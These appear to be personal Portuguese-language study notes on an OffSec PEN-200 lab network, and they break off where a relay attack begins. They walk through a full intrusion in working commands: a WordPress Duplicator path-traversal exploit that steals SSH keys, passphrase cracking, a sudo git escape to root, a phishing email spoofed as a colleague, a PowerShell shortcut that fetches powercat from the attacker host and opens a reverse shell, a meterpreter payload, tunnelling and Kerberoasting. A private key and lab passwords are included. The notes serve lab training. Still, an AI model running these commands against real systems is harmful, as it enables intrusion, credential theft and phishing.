## Ips utilizados nos exemplos
```json
{
    "my_ip": "192.168.45.223",
    "VM1": "172.16.114.240",
    "WINPREP_VM6": { "ip": "192.168.158.250", "user": "offsec", "pass": "lab" },
    "WEBSRV1_VM5": "192.168.158.244",
    "SO_VM4": "172.16.114.243",
    "MAILSRV1_VM3": "192.168.158.242",
    "SO_VM2": "172.16.114.241",
    "unkew_1": "172.16.114.254"  
}
```

## Pentest orientado
### Estruturação de ambiente inicial
É recomendado criar uma vm nova do kali para cada pentest, isso ajuda a isolar informações de cada pentest

dado os alvos fornecidos segue a estruturação básica do ambiente
```
<cliente>
├── creds.txt
├── <name-server-1>
└── <name-server-1>
```

comando base para estruturar o ambiente 
#commands/linux/mkdir
```bash
mkdir -p beyond/{mailsrv1,websrv1}
touch beyond/creds.txt
```

### Enumeração MAILSRV1_VM3 (Desnecessário)
#### Identificação de serviços e versões
Usaremos **-sV** para habilitar a detecção de serviço e versão, bem como **-sC** para usar os scripts padrão do Nmap. Além disso, digitaremos **-oN** para criar um arquivo de saída contendo os resultados do scan.
#commands/linux/nmap
```bash
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.158.242
```

Depois de identificados os serviços e versões, é feito pesquisas sobre os serviços e se eles possuem CVEs em versões que estão sendo utilizadas, no caso, foi encontrado CVEs antigos para o HmailServer porém não foi possível identificar qual a versão esta sendo executada no ambiente para determinar se esta vulnerável ou não.

#### Enumeração do IIS
 Usando **gobuster** . Digitaremos **dir** para usar o modo de enumeração de diretórios, **-u** para a URL, **-w** para uma lista de palavras e **-x** para os tipos de arquivo que queremos identificar. Para este exemplo, digitaremos **txt** , **pdf** e **config** para identificar documentos potenciais ou arquivos de configuração. Além disso, usaremos **-o** para criar um arquivo de saída.
```bash
gobuster dir -u http://192.168.158.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```
No entanto não obtivemos sucesso em obter alguma informação relevante na enumeração do IIS

### Enumeração WEBSRV1_VM5

#### Identificando serviços e versões
```bash
sudo nmap -sC -sV -oN websrv1/nmap 192.168.158.242
```

#### Determinar qual tecnologia esta sendo utilizada no serviço apache
```bash
whatweb http://192.168.158.242
```

#### Escaneando as vulnerabilidade o wordpress com o WPScan
```bash
wpscan --url http://192.168.158.242 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

#### procurando vulnerabilidades em plugins do wordpress específicos
```bash
searchsploit duplicator
```

#### Ver detalhes sobre o exploit
```bash
searchsploit -x 50420
```

#### Copiar o exploit para o diretório atual
```bash
cd websrv1
searchsploit -m 50420
```

#### Rodando o script para sequestrar credenciais
```bash
python3 50420.py http://192.168.158.242 /etc/passwd
```

![[Pasted image 20241229195954.png]]

#### Tentando obter a chave ssh do marcus (Desnecessário)
```bash
python3 50420.py http://192.168.158.244 /home/marcus/.ssh/id_rsa
```
porém não obtivemos sucesso pôs o usuário não possui ssh configurado

#### Tentando obter a chave ssh da daniela
```bash
python3 50420.py http://192.168.158.244 /home/daniela/.ssh/id_rsa
```

A chave será recuperada e deve ser salva no em um arquivo **id_rsa**, em seguida de as permissões `chmod 600 id_rsa`
agora a chave pode ser testada:
```bash
ssh -i id_rsa daniela@192.168.158.244
```
no entanto veremos que a chave é protegida por uma frase-senha, vamos tentar quebrá-la por meio de brute force
##### chave 
com a Daniela conseguimos obter a seguinte chave:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
TRWp3IXxIxFP/UxXRvzPiZDDB/Uk9NmKR820i0VaclY1/ZqL6ledMF8C+e9pfYBriye0Ee
kMUNJFFQbJzPO4qgB/aXDzARbKhKEOrWpCop/uGrlTuvjyhvnQ2XQEp58eNyl0HzqLEn7b
NALT6A+Si3QJpXmZYlA7LAn6Knc7O7nuichDEmTkTiChEJrzftbZE/dL1u3XPuvdCBlhgH
4UDN8t5cFJ9us3l/OAe33r7xvEein9Hh51ewWPKuxvUwD0J+mX/cME32tCTCNgLQMWozQi
SKAnhLR+AtV0hvZyQsvDHswdvJNoflNpsdWOTF7znkj7F6Ir+Ax6ah+Atp6FQaFW8jvX2l
Wrbm720VllATcAAAWQsOnD0FwxFsne8k26g6ZOFbCfw3NtjRuqIuIKYJst7+CKj7VDP3pg
FlFanpl3LnB3WHI3RuTB5MeeKWuXEIEG1uaQAK6C8OK6dB+z5EimQNFAdATuWhX3sl2ID0
fpS5BDiiWlVyUDZsV7J6Gjd1KhvFDhDCBuF6KyCdJNO+Y7I5T8xUPM4RLBidVUV2qfeUom
28gwmsB90EKrpUtt4YmtMkgz+dy8oHvDQlVys4qRbzE4/Dm8N2djaImiHY9ylSzbFPv3Nk
GiIQPzrimq9qfW3qAPjSmkcSUiNAIwyVJA+o9/RrZ9POVCcHp23/VlfwwpOlhDUSCVTmHk
JI0F2OIhV1VxjaKw81rv+KozwQgmOgyxUGAh8EVWAhRfEADwqmiEOAQKZtz+S0dpzyhwEs
uw9FFOOI75NKL//nasloslxGistCkrHiyx0iC0F8SLckEhisLh4peXxW7hI54as4RbzaLp
f4GE8KGrWPSQbDPxRz70WuTVE2+SV4aCcbg2Kjna8CDaYd8ux/k8Kx5PVKyKw+qUnMBt4N
xxQyq4LVvUQlVZX6mKCfda+9rudmFfRg7pcn6AXA7dKk21qv+BS2xoLSKc5j6KOe9bXvhP
5uGeWEyR19jSG4jVVF5mNalJAvN488oITINC+EoIDNR9YKFAX9D9amoQAt8EZf5avGfXty
iOGkAIEEDRRd6+8FUZCRf8y+urfqZZWIdXYVw3TXir7swlcKBnyu8eirrWHLjlTdUcA238
g+Xqj1a6JCcz0lJawI6f+YeW575LqKVV0ErDpdvxOBSJ8N9Z3bxOTZstsOqJKDd0aTsNV7
BgupTtelSJRj0AxWj0UQWis7OLwkw7fbXbVhsyBJUL/0/BXuCgR6TY04DjhTkpqPQMVn8s
7MyAn+9oCWmxd/7ODTqEeAByRMsu9ehdzQF327+n+Xwx4tq9cTizeLx9jY8HEpx5tGfiNN
miQQw7sSETLRag5ALPandyV3albE/IjcATio8ZDjAWjBUkqGTS8Xp7eSl5kwuh6tjaYcg/
qnKmEAMQ8Zx/mgNFd04W4AuxWdMPaJN/cT21XsHLZiGZ1QO9x9TmroaCue1TnHVc+3KA0x
j378pDLdhKJlmh/khJrM6Gd25IxUEhw6eTsvIyFLgRUaOT5Vmg/KsSrHCWXBFM2UFrnTwx
r8dWWQ7/01M8McSiBdy2sNA4NrpMxS5+kJ5y3CTrhIgOYBuQvhxLYGMI5JLkcNN/imrEAE
s1jbr7mBjvQe1HHgPxdufQhRGjWgxsE3Dc0D0MdpYnUbJ0zQ65cIIyS8X1AjeeBphh+XBO
1SMrrDusvyTPfHbsv8abnMTrVSTzMiVYd+2QaRgg87Jy5pgg455EVcMWLVNchGtLaeaOA4
AXFZFjNXQC611fVaNXyJwpsmWYnCSraEjmwTjx9m9IEd5BMTbyrh7JbG2U1bmuF+OfBXuO
95Fs5KWi+S3JO3NWukgdWY0UY/5JXC2JrjcyGN0W/VzNldvSQBoIVvTo9WJaImcu3GjPiI
t9SDl3nbnbJIwqcq4Twymf5uWkzLiSvk7pKMbSOjx4hpxfqb4WuC0uFeijfMnMrIIb8FxQ
bQUwrNcxJOTchq5Wdpc+L5XtwA6a3MyM+mud6cZXF8M7GlCkOC0T21O+eNcROSXSg0jNtD
UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----
```

#### Tentando um bruteforce na chave obtida
usando o **ssh2john** iremos gerar um arquivo **ssh.hash** a partir do arquivo **id_rsa**
```bash
ssh2john id_rsa > ssh.hash
```

agora iniciamos o bruteforce com o **john** usando a wordlist da **rockyou** passando o **ssh.hash** como argumento 
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

depois de algum tempo conseguimos descobrir que a senha é **tequieromucho** ![[Pasted image 20241229202411.png]]
agora é só entrar novamente com ssh da **daniela**
```bash
ssh -i id_rsa daniela@192.168.158.244

# Enter passphrase for key 'id_rsa': tequieromucho
```

#### Uma vez com o primeiro acesso obtido, vamos usar uma automação para obtenção rápida de informações do ambiente com linPEAS
1. Vamos copiar o **linpeas.sh** para o diretório atual
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
```

##### funcional
1. abra o **linpeas.sh** em um editor de texto e copie todo o text.
2. no ssh crie o arquivo com o `nano linpeas.sh` e cole todo o conteúdo copiado
3. agora damos as pesmissões `chmod a+x ./linpeas.sh`


##### não funcional
2. Vamos subir um servidor python para deixar o **linpeas.sh** disponível
```bash
python3 -m http.server 80
```

3. no ssh iremos baixar o **linpeas.sh** e torna-lo executável
```
wget http://<ip-local>/linpeas.sh
```

#### Elevando o privilégio com o git
Uma vez descoberto que o git tem sudo, e pode ser usado sem senha podemos abusar disso para obter um shell interativo com sudo
```bash
sudo git -p help config
```

o help do git irá invocar o **less** para exibir toda a informação do help, aparentemente é possível fugir do fluxo do **less** direto para o bash só digitando `!/bin/bash` e dando o enter
![[Pasted image 20241229213221.png]]
QUE BIZARROOOO !!!!!!!

#### Procurando informações sensíveis no repositório git local
vamos mudar par o diretório apontado pelo **lenpeas.sh** `cd /srv/www/wordpress/`
com o git podemos verificar informações sensíveis em versões anteriores, ao rodar o git log vemos que só existem dois commits
```bash
git log
```

a saida indica que o servidor tinha acesso a rede interna e o commit mais recente mudou isso, poderíamos dar um checkout no hash do commit anterior mas isso refletiria na execução da aplicação, no entanto podemos só dar um `git show <hash>` no hash do commit anterior e analisar as mudanças

![[Pasted image 20241229215948.png]]

#### Tentando acesso a rede interna
precisamos criar um lista de usuários e uma lista de senhas com as credenciais já obtidas
```bash
# usernames.txt
nano usernames.txt
daniela
marcus
john

# passwords.txt
nano passwords.txt
DanielKeyboard3311
tequieromucho
dqsTwTpZPn#nL
```

agora rodamos o **crackmapexec** para verificar estas credenciais na máquina **MAILSRV1_VM3**
```bash
crackmapexec smb 192.168.158.242 -u usernames.txt -p passwords.txt --continue-on-success
```

com isso conseguimos obter a confirmação de que john é um usuário, portanto vamos identificar arquivos compartilhados. Podemos identificar compartilhamentos acessíveis contendo informações adicionais que podemos usar para a segunda opção.
```bash
crackmapexec smb 192.168.158.242 -u john -p "dqsTwTpZPn#nL" --shares
```

no entanto o **crackmapexec** mostra que os compartilhamentos disponíveis não tem utilidade para nós.

#### Ataque no lado do cliente
1. primeiro criamos uma pasta **webdav** dentro da pasta **beyond**
2. rodamos o **wsgidav** na pasta criada.
```bash
wsgidav --port=80 --host=0.0.0.0 --root=./webdev --auth=anonymous
```
3. na pasta beyond do kali vamos criar um arquivo **config.Library-ms**, também iremos criar este mesmo arquivo no lado do **WINPREP_VM6** pela conexão RDP com usuário **offsec** e senha **lab**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.223</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
4. Também é necessário criar um atalho no lado do **WINPREP_VM6**, o atalho deve ter o seguinte comando, também vamos enviar este arquivo para o nosso kali na pasta **beyond**:
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223:8000/powercat.ps1'); powercat -c 192.168.45.223 -p 4444 -e powershell"
```

5. Vamos subir um servidor para disponibilizar o PowerCat.ps1 na pasta beyond
```bash
# copia o powercat para a pasta beyond
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
# sobe o servidor na porta 8000 como especificado no shortcut
python3 -m http.server 8000
```

6. preparamos um ouvinte para fazer o shellreverse com o ncat na porta 4444
```bash
nc -nvlp 4444
```

7. Criaremos o arquivo **body.txt em** **/home/kali/beyond** com o seguinte texto:
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

8. Com tudo pronto agora vamos enviar o email com o **config.Library-ms** como anexo, sendo que vamos fazer parecer que o email foi enviado do **john**, isso porque vamos usar o usuário e senha dele para enviar o email 
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.158.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

# Username: john
# Password: dqsTwTpZPn#nL
```

**Obs:** Os arquivos **config.Library-ms** e o **powershell.link** devem estar dentro da pasta **webdav** para funcionar e o servidor deve estar ativo na porta 80

9. Depois de um tempo espera só um pouco que o shell reverso acontece.![[Pasted image 20241230001232.png]]

#### Enumeração inicial e reconhecimento da rede interna
1. vamos copiar o **winPEAS.exe** para a nossa pasta **beyond** que tem um servidor python3 rodando,  
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
```

2. No **shellreverse** vamos entrar no diretório **home** do **marcus** e fazer o download do **winPEAS.exe**
```powershell
cd C:\Users\marcus
iwr -uri http://192.168.45.223:8000/winPEASx64.exe -Outfile winPEAS.exe
```

3. confirmando o os da máquina local, isso porque o winPEAS pode detectar falsamente o windows 11 como windows 10, para confirmar usamos o comando **systeminfo**

4. Em seguida vamos salvar em um arquivo as máquinas mapeadas da rede
```
cat computer.txt

192.168.113.240 - DCSRV1.BEYOND.COM
-> Domain Controller

192.168.113.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

192.168.113.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

#### Enumeração inicial do Active Directory
###### 1. Copiaremos o coletor do **PowerShell** para **/home/kali/beyond** em uma nova aba do terminal para servi-lo por meio do servidor web Python3 na porta 8000.
```bash
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

###### 2. agora vamos baixar no alvo o **SharpHound**
```powershell
iwr -uri http://192.168.45.223:8000/SharpHound.ps1 -Outfile SharpHound.ps1
```

###### 3. agora é só executar o **SharpHound** no lado do alvo
```bash
powershell -ep bypass # bypass da politica que impede a execução de scripts shell

. .\SharpHound.ps1
```

###### 4. agora que o **SharpHound** esta carregado podemos rodar o comando `Invoke-BloodHound -CollectionMethod All` que vai gerar um arquivo zip com todas as informações que precisamos.

###### 5. vamos enviar o arquivo **zip** para a máquina **kali**, dado que temos um **servidor python** ativo na **porta 8000** vamos usar o seguinte comando no windows
```bash
C:\Windows\System32\curl.exe -T "C:\Users\marcus\20241230015245_BloodHound.zip" http://192.168.45.223/20241230015245_BloodHound.zip

C:\Windows\System32\curl.exe -T "C:\Users\marcus\blood.zip" http://192.168.45.223/blood.zip
```

###### 6. Query para identificar as contas usuário admins
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

###### 7. Existe uma consulta pre construída que lista todos as contas de usuários do kérberos `List all Kerberoastable Accounts`

###### 8. Clicando no nó da daniela podemos analisar as informações do nó 
![[Pasted image 20250102011407.png]]
A Figura 15 mostra o SPN mapeado **http/internalsrv1.beyond.com** . Com base nisso, podemos assumir que um servidor web está sendo executado em INTERNALSRV1. Depois que tivermos executado o Kerberoasting e potencialmente obtido a senha em texto simples para _daniela_ , podemos usá-la para acessar INTERNALSRV1.

No entanto, como já dissemos antes, encontrar um vetor acionável não deve interromper nosso processo de enumeração. Devemos coletar todas as informações, priorizá-las e, então, executar ataques potenciais.

#### Configuração do proxy SOCKS5 para enumeração de rede via Nmap e CrackMapExec 
###### 1. Criaremos um shell reverso TCP Meterpreter staged como um arquivo executável com msfvenom . Como podemos reutilizar o binário em todo o domínio, podemos armazená-lo em /home/kali/beyond .

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.223 LPORT=443 -f exe -o met.exe
```

###### 2. Vamos iniciar um listener _multi/handler_ com as configurações correspondentes no Metasploit. Além disso, **definiremos** a opção **ExitOnSession** como **false** . Ela especifica que o listener permanece ativo para novas sessões sem a necessidade de reiniciá-lo para cada sessão de entrada.

```bash
sudo msfconsole -q

# msf6 ->
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.223
set LPORT 443
set ExitOnSession false
run -j # executa o script e gera o payload
```

###### 3. Agora vamos baixar e executar o payload na máquina invadida

```shell
iwr -uri http://192.168.45.223:8000/met.exe -Outfile met.exe
.\met.exe
# No Metasploit, uma nova sessão deve aparecer
```

###### 4. Depois que a sessão 1 for aberta, podemos usar **multi/manage/autoroute** e **auxiliary/server/socks_proxy** para criar um proxy SOCKS5 para acessar a rede interna da nossa caixa Kali, como aprendemos no módulo "The Metasploit Framework".

```bash
# msf6 exploit(multi/handler) >
use multi/manage/autoroute

set session 1
run # este comando vai retornar um range que precisaremos usar nos próximos comandos
# [+] Route added to subnet 172.16.114.0/255.255.255.0 from host's routing table. (172.16.114) 

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

Obs:
O proxy SOCKS5 agora está ativo e podemos usar _proxychains_ para acessar a rede interna. Vamos confirmar que **/etc/proxychains4.conf** ainda contém as configurações necessárias dos Módulos anteriores. Ou seja, apenas a entrada SOCKS5 da listagem a seguir deve estar ativa.
	
```bash
cat /etc/proxychains4.conf

# . . .
# socks4  127.0.0.1 9050
```

#### Enumeração de rede com Proxychains
###### 1. (Desnecessário) (gerando erro) Vamos começar com o módulo SMB do CrackMapExec para recuperar informações básicas dos servidores identificados (como configurações SMB). Também forneceremos as credenciais para _john_ listar os compartilhamentos SMB e suas permissões com **--shares** . Como o CrackMapExec não tem uma opção para especificar um arquivo de saída, copiaremos os resultados manualmente e os armazenaremos em um arquivo.

```bash
# o range 172.16.114 foi obtido o metaxploit do comando run, rodado na configuração do proxy
proxychains -q crackmapexec smb 172.16.114.240-241 172.16.114.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```

saida:
```
SMB         172.16.6.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.6.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.240    445    DCSRV1           [+] Enumerated shares
SMB         172.16.6.240    445    DCSRV1           Share           Permissions     Remark
SMB         172.16.6.240    445    DCSRV1           -----           -----------     ------
SMB         172.16.6.240    445    DCSRV1           ADMIN$                          Remote Admin
SMB         172.16.6.240    445    DCSRV1           C$                              Default share
SMB         172.16.6.240    445    DCSRV1           IPC$            READ            Remote IPC
SMB         172.16.6.240    445    DCSRV1           NETLOGON        READ            Logon server share 
SMB         172.16.6.240    445    DCSRV1           SYSVOL          READ            Logon server share 
SMB         172.16.6.241    445    INTERNALSRV1     [+] Enumerated shares
SMB         172.16.6.241    445    INTERNALSRV1     Share           Permissions     Remark
SMB         172.16.6.241    445    INTERNALSRV1     -----           -----------     ------
SMB         172.16.6.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
SMB         172.16.6.241    445    INTERNALSRV1     C$                              Default share
SMB         172.16.6.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
SMB         172.16.6.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.254    445    MAILSRV1         [+] Enumerated shares
SMB         172.16.6.254    445    MAILSRV1         Share           Permissions     Remark
SMB         172.16.6.254    445    MAILSRV1         -----           -----------     ------
SMB         172.16.6.254    445    MAILSRV1         ADMIN$                          Remote Admin
SMB         172.16.6.254    445    MAILSRV1         C$                              Default share
SMB         172.16.6.254    445    MAILSRV1         IPC$            READ            Remote IPC
```

A saída também declara que MAILSRV1 e INTERNALSRV1 têm _a assinatura SMB_ definida como _False_ . Sem esse mecanismo de segurança habilitado, podemos potencialmente executar ataques de retransmissão se pudermos forçar uma solicitação de autenticação.

**Possível solução do problema**: #commands/linux/crackmapexec
O erro indica que a versão **5.4.1** do CrackMapExec não está disponível no **PyPI**. Isso é comum quando uma versão específica do software só pode ser obtida diretamente do repositório no **GitHub**.

Siga os passos abaixo para instalar o CrackMapExec 5.4.1 diretamente do GitHub:

---

1. **Remova a versão anterior (opcional)**
Se você deseja começar do zero, pode remover a versão atual (5.4.0) antes de continuar:
`pip uninstall crackmapexec --break-system-packages`

---

2. **Baixe a versão 5.4.1 do GitHub**
	1. Clone o repositório oficial: `git clone https://github.com/Porchetta-Industries/CrackMapExec.git cd CrackMapExec`
	2. Faça checkout da versão **5.4.1**: `git checkout 5.4.1`

---

3. **Instale a versão 5.4.1 manualmente**

	Certifique-se de estar no diretório do repositório clonado e execute:`python3 setup.py install --user`
	Se o comando falhar devido à proteção do ambiente gerenciado, você pode usar a flag `--break-system-packages`: `python3 setup.py install --break-system-packages`

---

4. **Verifique a versão instalada**

	Após a instalação, confirme a versão com:`crackmapexec --version`
	Se mostrar **5.4.1**, você está pronto para usar!

###### 2. Em seguida, vamos usar o Nmap para executar uma varredura de porta em portas comumente usadas por aplicativos da web e servidores FTP visando MAILSRV1, DCSRV1 e INTERNALSRV1. Temos que especificar **-sT** para executar uma varredura de conexão TCP. Caso contrário, o Nmap não funcionará em Proxychains.

```bash
# não esquecer de modificar os ranges 172.16.144 para o respectivo regado na configuração do proxy
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.114.240 172.16.114.241 172.16.114.254
```

A saída mostra que o Nmap identificou as portas abertas 80 e 443 em 172.16.6.241 (INTERNALSRV1) e a porta 80 em 172.16.6.254 (MAILSRV1). Por enquanto, podemos pular a última, pois é mais provável que seja a mesma página da web e serviço que enumeramos de uma perspectiva externa.

#### (Opcional) Configurando o chisel para exploit dos serviços web (Approach bom para aprender coisas, mas não terá resultados significantes)
Embora pudéssemos usar o proxy SOCKS5 e proxychains para navegar até a porta aberta em 172.16.114.241, usaremos _o Chisel_ [6](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-internal-network-48813/services-and-sessions-48787#fn-local_id_24-6) , pois ele fornece uma sessão de navegador mais estável e interativa. Na página de lançamentos, [7](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-internal-network-48813/services-and-sessions-48787#fn-local_id_24-7) baixamos as versões amd64 do Windows e Linux e extraímos os binári
os em **/home/kali/beyond/** .

Em nossa máquina Kali, usaremos o Chisel no modo servidor para receber conexões de entrada na porta 8080. Além disso, adicionaremos a opção **--reverse para permitir o encaminhamento reverso de porta.**

###### rodando o chisel server no kali
```bash
chisel server --port 8080 --reverse
```

###### baixando o client para windows
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip chisel_1.10.1_windows_amd64.gz
mv chisel_1.10.1_windows_amd64 chisel.exe
```

###### no meterpreter nós entramos na seção e fazemos o upload do chisel.exe
```
sessions -i 1
upload chisel.exe C:\\Users\\marcus\\chisel.exe
```

###### Rodando o chisel client
Agora, podemos entrar no **shell** e utilizar o Chisel no modo cliente para conectar de volta à nossa máquina Kali na porta 8080. Criaremos um encaminhamento de porta reverso com a sintaxe **R:localport:remotehost:remoteport** . No nosso caso, o host remoto e a porta são 172.16.114.241 e 80. A porta local que queremos utilizar é 80.

```bash
# não esquecer de modificar o terceiro octeto que no casso é 114
.\chisel.exe client 192.168.45.223:8080 R:80:172.16.114.241:80
.\chisel.exe client 192.168.45.223:8080 R:80:172.16.114.241:80
```

no navegador firefox do kali vamos ir para `127.0.0.1` e devemos conseguir abrir a página do wordpress graças ao tunelamento que nós criamos

###### Vamos navegar até a página de login do painel do WordPress em **http://127.0.0.1/wordpress/wp-admin** e tentar fazer login com as credenciais que descobrimos até agora.
A barra de navegação no Firefox mostra que fomos redirecionados para **internalsrv1.beyond.com** . Podemos assumir que a instância do WordPress tem o nome DNS definido como este endereço em vez do endereço IP. Como nossa máquina não tem informações sobre este nome DNS, não podemos conectar à página.

Para poder usar totalmente o aplicativo web, adicionaremos **internalsrv1.beyond.com** via **127.0.0.1** para **/etc/hosts** .
```bash
sudo nano /etc/hosts

127.0.0.1       localhost
127.0.0.1       internalsrv1.beyond.com
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

Agora, vamos abrir a página **/wp-admin** novamente : http://127.0.0.1/wordpress/wp-admin .

Vamos tentar fazer login com as credenciais que obtivemos até agora, bem como pares comuns de nome de usuário e senha, como **admin:admin** . **Infelizmente, nenhum deles funciona.**

Vamos resumir as informações que reunimos nesta seção antes de tentarmos nossos ataques. Primeiro, enumeramos todas as sessões ativas. Curiosamente, o administrador de domínio _beccy_ tem uma sessão ativa em MAILSRV1. Em seguida, identificamos _daniela_ como um usuário kerberoastable devido ao SPN **http/internalsrv1.beyond.com** .

Então, configuramos um proxy SOCKS5 com o Metasploit e usamos o CrackMapExec e o Nmap para executar a enumeração de rede. A saída revelou que MAILSRV1 e INTERNALSRV1 têm cada um um servidor web acessível e a assinatura SMB desabilitada. Por meio do Chisel, conseguimos navegar até a instância do WordPress em INTERNALSRV1. No entanto, nenhuma das credenciais funcionou para fazer login na página de login do WordPress.

#### Fale entre kerberos
Com base nas informações da Unidade de Aprendizagem anterior, o aplicativo web no INTERNALSRV1 é o alvo mais promissor no momento. Como é um site WordPress, poderíamos usar o WPScan novamente ou usar ataques de senha para fazer login com sucesso no painel do WordPress.

Toda vez que obtemos novas informações, devemos reavaliar o que já sabemos. Para nossa situação, isso significa que já obtivemos a informação de que _daniela_ tem um SPN http mapeado para INTERNALSRV1. Nossa suposição neste ponto é que _daniela_ pode conseguir fazer login na página de login do WordPress com sucesso.

Como _daniela_ é kerberoastable, podemos tentar recuperar a senha do usuário dessa forma. Se pudermos quebrar o hash de senha _TGS-REP_ [1](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/attacking-an-internal-web-application-48812/speak-kerberoast-and-enter-48797#fn-local_id_577-1) , poderemos fazer login no WordPress e obter mais acesso ao INTERNALSRV1.

Se esse vetor de ataque falhar, podemos usar o WPScan e outras ferramentas de enumeração de aplicativos da web para identificar vulnerabilidades potenciais no INTERNALSRV1 ou alternar os alvos para MAILSRV1.

###### (não funciona) Vamos executar Kerberoasting no Kali com _impacket-GetUserSPNs_ sobre o proxy SOCKS5 usando Proxychains. Para obter o hash TGS-REP para _daniela_ , temos que fornecer as credenciais de um usuário de domínio. Como temos apenas um conjunto válido de credenciais, usaremos _john_ .

Este comando não funcionou para a mim, estava dando 
```bash
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.114.240 beyond.com/john
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.114.240 beyond.com/john
# [-] [Errno 111] Connection refused
```

###### Força bruta para obter a senha da Daniela
primeiro salvamos o hash obtido em um arquivo **daniela.hash**

agora rodamos o comando que vai descobrir a senha equivalente ao hash
```bash
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
```

a senha obtida é **DANIelaRO123** vamos salvar em creds.txt

agora usaremos o usuário e senha da daniela para logar no wordpress admin


#### Ataque e retransmissão do wordpress abusando do plugin

Vamos configurar **o impacket-ntlmrelayx** antes de modificar o _caminho do diretório de backup_ no plugin do WordPress. Usaremos **--no-http-server** e **-smb2support** para desabilitar o servidor HTTP e habilitar o suporte SMB2. Especificaremos o endereço externo para MAILSRV1, 192.168.158.242, como alvo para o ataque de retransmissão. Ao inserir o endereço externo, não precisamos fazer proxy do nosso ataque de retransmissão via Proxychains. Por fim, codificaremos em base64 um _shell reverso PowerShell oneliner_ [3](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/attacking-an-internal-web-application-48812/abuse-a-wordpress-plugin-for-a-relay-attack-48798#fn-local_id_690-3) que se conectará de volta à nossa máquina Kali na porta 9999 e o fornecerá como um comando para **-c** .

###### não foi preciso codificar para base64
```shell
